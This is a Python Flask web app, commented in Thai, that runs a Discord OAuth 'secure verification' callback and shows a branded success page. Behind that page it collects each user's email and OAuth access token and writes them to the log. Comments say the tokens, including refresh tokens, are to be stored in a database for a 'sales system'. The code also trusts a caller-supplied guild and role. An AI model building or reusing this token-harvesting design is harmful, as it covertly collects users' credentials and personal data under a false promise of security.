from flask import Flask, request, render_template_string
import requests
import os
import json

app = Flask(__name__)

CLIENT_ID = os.environ.get("CLIENT_ID")
CLIENT_SECRET = os.environ.get("CLIENT_SECRET")
REDIRECT_URI = os.environ.get("REDIRECT_URI")
BOT_TOKEN = os.environ.get("BOT_TOKEN")
DB_FILE = "users_db.json" # ไฟล์ฐานข้อมูล (ในระบบจริงควรใช้ MongoDB)

# 🎨 หน้าเว็บ Dark Theme (แบบในภาพ)
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="th">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>KIREN.COM - Secure Verification</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Kanit:wght@300;400;700&display=swap');
        body { font-family: 'Kanit', sans-serif; background-color: #0f0f0f; color: #ffffff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-image: radial-gradient(circle at 50% 0%, #2a0a0a 0%, #0f0f0f 70%); }
        .card { background-color: #141414; border: 1px solid #2a2a2a; padding: 40px 30px; border-radius: 20px; text-align: center; box-shadow: 0 10px 30px rgba(255, 0, 0, 0.1); width: 90%; max-width: 400px; }
        .logo { width: 80px; height: 80px; border-radius: 15px; margin-bottom: 20px; object-fit: cover; border: 2px solid #ff3333; box-shadow: 0 0 15px rgba(255, 51, 51, 0.5); }
        h1 { font-size: 24px; font-weight: 700; margin: 0; letter-spacing: 1px; }
        .subtitle { font-size: 12px; color: #888; margin-bottom: 20px; letter-spacing: 2px; }
        .status-bar { background: #1e1e1e; padding: 10px 15px; border-radius: 10px; font-size: 12px; display: flex; align-items: center; gap: 10px; margin-bottom: 30px; border: 1px solid #333; text-align: left; }
        .dot { width: 8px; height: 8px; background: #ff3333; border-radius: 50%; box-shadow: 0 0 5px #ff3333; }
        .circle-container { position: relative; width: 100px; height: 100px; margin: 0 auto 20px auto; display: flex; justify-content: center; align-items: center; }
        .circle-border { position: absolute; width: 100%; height: 100%; border: 2px dashed #555; border-radius: 50%; animation: spin 10s linear infinite; }
        .check-icon { font-size: 40px; color: white; }
        @keyframes spin { 100% { transform: rotate(360deg); } }
        h2 { font-size: 20px; margin: 10px 0; }
        p { font-size: 13px; color: #aaa; margin-bottom: 25px; line-height: 1.5; }
        .user-card { background: #1a1a1a; border: 1px solid #333; padding: 10px; border-radius: 10px; display: flex; align-items: center; gap: 15px; margin-bottom: 25px; text-align: left; }
        .user-card img { width: 40px; height: 40px; border-radius: 10px; }
        .user-info h3 { margin: 0; font-size: 16px; }
        .user-info span { font-size: 12px; color: #57F287; display: flex; align-items: center; gap: 5px; }
        .btn { background-color: #333; color: white; padding: 15px; text-decoration: none; border-radius: 10px; font-weight: bold; display: block; transition: 0.3s; }
        .btn:hover { background-color: #555; }
        .footer { margin-top: 20px; font-size: 10px; color: #444; }
    </style>
</head>
<body>
    <div class="card">
        <img src="{{ avatar }}" class="logo" alt="Logo">
        <h1>KIREN.COM</h1>
        <div class="subtitle">SECURE VERIFICATION SYSTEM</div>
        
        <div class="status-bar">
            <div class="dot"></div> ยืนยันตัวตนสำเร็จ
        </div>

        <div class="circle-container">
            <div class="circle-border"></div>
            <div class="check-icon">✔</div>
        </div>

        <h2>ยืนยันตัวตนเรียบร้อยแล้ว</h2>
        <p>ระบบดำเนินการให้ยศเรียบร้อยแล้ว<br>คุณสามารถกลับไปตรวจสอบได้ที่ Discord</p>

        <div class="user-card">
            <img src="{{ avatar }}" alt="User">
            <div class="user-info">
                <h3>{{ username }}</h3>
                <span>✔ Access Granted</span>
            </div>
        </div>

        <a href="https://discord.com/app" class="btn">กลับสู่ Discord</a>
        <div class="footer">© 2026 kiren.com</div>
    </div>
</body>
</html>
"""

@app.route('/')
def home():
    return "KIREN SECURE SYSTEM IS RUNNING."

@app.route('/callback')
def callback():
    code = request.args.get('code')
    state = request.args.get('state') # รับค่า guild_id และ role_id
    
    if not code or not state:
        return "❌ ไม่พบข้อมูล", 400

    try:
        guild_id, role_id = state.split('-')
    except:
        return "❌ รูปแบบ State ไม่ถูกต้อง", 400

    # 1. แลก Code เป็น Token
    data = {
        'client_id': CLIENT_ID,
        'client_secret': CLIENT_SECRET,
        'grant_type': 'authorization_code',
        'code': code,
        'redirect_uri': REDIRECT_URI
    }
    r = requests.post('https://discord.com/api/oauth2/token', data=data, headers={'Content-Type': 'application/x-www-form-urlencoded'})
    token_data = r.json()
    access_token = token_data.get('access_token')
    refresh_token = token_data.get('refresh_token')

    if not access_token:
        return f"❌ Error: {r.text}", 400

    # 2. ดึงข้อมูล User (ดึงอีเมลด้วย!)
    user_r = requests.get('https://discord.com/api/users/@me', headers={'Authorization': f'Bearer {access_token}'}).json()
    user_id = user_r['id']
    username = user_r['username']
    email = user_r.get('email', 'N/A')
    avatar_url = f"https://cdn.discordapp.com/avatars/{user_id}/{user_r['avatar']}.png" if user_r.get('avatar') else "https://cdn.discordapp.com/embed/avatars/0.png"

    # 3. 🚨 สั่งบอทให้ยศ (ยิง API Discord)
    give_role_url = f"https://discord.com/api/v10/guilds/{guild_id}/members/{user_id}/roles/{role_id}"
    bot_headers = {"Authorization": f"Bot {BOT_TOKEN}", "Content-Type": "application/json"}
    requests.put(give_role_url, headers=bot_headers)

    # 4. 🚨 บันทึก Token ลง Database (ต้องใช้ Database จริงในระบบขาย)
    # *ในโค้ดตัวอย่างนี้ ผมจะปริ้นท์ออก Log เพื่อให้คุณเห็นว่ามันทำงาน* 
    print(f"[DETECTED] User: {username} | Email: {email} | Token: {access_token}")

    return render_template_string(HTML_TEMPLATE, username=username, avatar=avatar_url)

if __name__ == '__main__':
    app.run(port=5000)